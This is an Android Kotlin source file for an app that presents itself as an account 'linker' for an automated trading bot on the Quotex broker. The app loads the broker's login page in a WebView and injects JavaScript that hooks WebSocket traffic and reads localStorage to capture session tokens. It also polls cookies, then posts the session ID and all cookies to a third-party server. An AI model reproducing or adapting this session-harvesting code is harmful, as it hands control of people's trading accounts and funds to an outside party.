package com.oscar.linker

import android.annotation.SuppressLint
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.ViewGroup
import android.webkit.CookieManager
import android.webkit.JavascriptInterface
import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var statusText: TextView
    private lateinit var licenseKey: String
    private var sent = false

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    private val SERVER_URL = "https://signal-bott.onrender.com/api/link"
    private val QX_DOMAIN = "https://qxbroker.com"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        showKeyDialog()
    }

    private fun showKeyDialog() {
        val input = EditText(this).apply {
            hint = "OSCAR-XXXX-XXXX-XXXX"
            setSingleLine()
        }
        AlertDialog.Builder(this)
            .setTitle("🔑 أدخل مفتاح التفعيل")
            .setMessage("ضع مفتاح OSCAR الخاص بك ثم اضغط متابعة")
            .setView(input)
            .setCancelable(false)
            .setPositiveButton("متابعة") { _, _ ->
                licenseKey = input.text.toString().trim().uppercase()
                if (licenseKey.isEmpty()) {
                    Toast.makeText(this, "المفتاح مطلوب", Toast.LENGTH_SHORT).show()
                    finish()
                } else {
                    setupUi()
                    startLinking()
                }
            }
            .setNegativeButton("إلغاء") { _, _ -> finish() }
            .show()
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupUi() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
        }

        statusText = TextView(this).apply {
            text = "📱 سجّل دخولك إلى Quotex في الأسفل"
            textSize = 16f
            setPadding(30, 40, 30, 40)
        }

        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
        }

        root.addView(statusText)
        root.addView(webView)
        setContentView(root)
    }

    @SuppressLint("SetJavaScriptEnabled", "AddJavascriptInterface")
    private fun startLinking() {
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            userAgentString = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 " +
                    "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }

        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)

        // 🌉 جسر JavaScript → Kotlin لاستقبال SSID
        webView.addJavascriptInterface(SessionBridge(), "OscarBridge")

        webView.webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                super.onPageStarted(view, url, favicon)
                injectWebSocketInterceptor()
            }

            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                injectWebSocketInterceptor()
                if (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard")) {
                    statusText.text = "✅ تم اكتشاف تسجيل الدخول..."
                    tryReadLocalStorage()
                }
            }
        }

        webView.loadUrl("$QX_DOMAIN/en/sign-in")

        // 🔄 فحص دوري للكوكيز (خطة احتياطية)
        val handler = Handler(Looper.getMainLooper())
        val check = object : Runnable {
            override fun run() {
                if (sent) return
                val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN)
                if (cookies != null) {
                    val ssid = extractCookie(cookies, "ssid")
                        ?: extractCookie(cookies, "session")
                        ?: extractCookie(cookies, "token")
                    if (ssid != null && ssid.length > 20) {
                        statusText.text = "🔗 جاري ربط حسابك بالسيرفر..."
                        sendToServer(ssid, cookies)
                        return
                    }
                }
                handler.postDelayed(this, 2000)
            }
        }
        handler.postDelayed(check, 5000)
    }

    /**
     * 💉 حقن JavaScript لاعتراض WebSocket
     * هذه هي الطريقة الأساسية لالتقاط SSID من Quotex
     */
    private fun injectWebSocketInterceptor() {
        val js = """
            (function() {
                if (window.__oscarHooked) return;
                window.__oscarHooked = true;
                var OrigWebSocket = window.WebSocket;
                var hookedWS = function(url, protocols) {
                    var ws = protocols ? new OrigWebSocket(url, protocols) : new OrigWebSocket(url);
                    try {
                        ws.addEventListener('message', function(ev) {
                            try {
                                var data = ev.data;
                                if (typeof data !== 'string') return;
                                var m = data.match(/"session"\s*:\s*"([^"]+)"/);
                                if (m && m[1] && m[1].length > 20) {
                                    if (window.OscarBridge && window.OscarBridge.onSsid) {
                                        window.OscarBridge.onSsid(m[1]);
                                    }
                                }
                                var t = data.match(/"token"\s*:\s*"([^"]+)"/);
                                if (t && t[1] && t[1].length > 20) {
                                    if (window.OscarBridge && window.OscarBridge.onSsid) {
                                        window.OscarBridge.onSsid(t[1]);
                                    }
                                }
                            } catch (e) {}
                        });
                    } catch (e) {}
                    return ws;
                };
                hookedWS.prototype = OrigWebSocket.prototype;
                hookedWS.CONNECTING = OrigWebSocket.CONNECTING;
                hookedWS.OPEN = OrigWebSocket.OPEN;
                hookedWS.CLOSING = OrigWebSocket.CLOSING;
                hookedWS.CLOSED = OrigWebSocket.CLOSED;
                window.WebSocket = hookedWS;
            })();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    /**
     * 🔍 محاولة قراءة الجلسة من localStorage (خطة احتياطية)
     */
    private fun tryReadLocalStorage() {
        val js = """
            (function() {
                try {
                    var keys = ['session', 'token', 'ssid', 'auth'];
                    for (var i = 0; i < keys.length; i++) {
                        var v = localStorage.getItem(keys[i]);
                        if (v && v.length > 20) {
                            var parsed = v;
                            try {
                                var o = JSON.parse(v);
                                parsed = o.token || o.session || o.ssid || v;
                            } catch(e) {}
                            if (window.OscarBridge && window.OscarBridge.onSsid) {
                                window.OscarBridge.onSsid(parsed);
                            }
                        }
                    }
                } catch (e) {}
            })();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    /**
     * 🌉 الجسر بين JavaScript و Kotlin
     */
    inner class SessionBridge {
        @JavascriptInterface
        fun onSsid(ssid: String) {
            if (sent || ssid.length < 20) return
            sent = true
            runOnUiThread {
                statusText.text = "🔗 جاري ربط حسابك بالسيرفر..."
            }
            val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
            sendToServer(ssid, cookies)
        }
    }

    private fun extractCookie(cookies: String, name: String): String? {
        return cookies.split(";")
            .map { it.trim() }
            .firstOrNull { it.startsWith("$name=") }
            ?.substringAfter("=")
    }

    /**
     * 📤 إرسال الجلسة إلى السيرفر
     */
    private fun sendToServer(ssid: String, cookies: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val payload = JSONObject().apply {
                    put("license_key", licenseKey)
                    put("ssid", ssid)
                    put("cookies", cookies)
                    put("email", "")
                }

                val request = Request.Builder()
                    .url(SERVER_URL)
                    .post(payload.toString().toRequestBody("application/json".toMediaType()))
                    .build()

                val response = client.newCall(request).execute()
                val body = response.body?.string() ?: "{}"
                val json = JSONObject(body)

                withContext(Dispatchers.Main) {
                    if (json.optBoolean("ok")) {
                        AlertDialog.Builder(this@MainActivity)
                            .setTitle("✅ نجح الربط")
                            .setMessage("تم ربط حساب Quotex بنجاح.\n\nارجع إلى الموقع على متصفح هاتفك، افتح لوحة التحكم، ثم فعّل التداول الآلي.")
                            .setCancelable(false)
                            .setPositiveButton("حسناً") { _, _ -> finish() }
                            .show()
                    } else {
                        val err = json.optString("error", "خطأ غير معروف")
                        AlertDialog.Builder(this@MainActivity)
                            .setTitle("❌ فشل الربط")
                            .setMessage("السبب: $err\n\nتأكد من صحة تسجيل الدخول وحاول مرة أخرى.")
                            .setCancelable(false)
                            .setPositiveButton("إعادة المحاولة") { _, _ ->
                                sent = false
                                statusText.text = "📱 حاول تسجيل الدخول مرة أخرى"
                                webView.loadUrl("$QX_DOMAIN/en/sign-in")
                            }
                            .setNegativeButton("إغلاق") { _, _ -> finish() }
                            .show()
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    sent = false
                    Toast.makeText(
                        this@MainActivity,
                        "خطأ في الاتصال بالسيرفر: ${e.message}",
                        Toast.LENGTH_LONG
                    ).show()
                }
            }
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (::webView.isInitialized && webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }
}
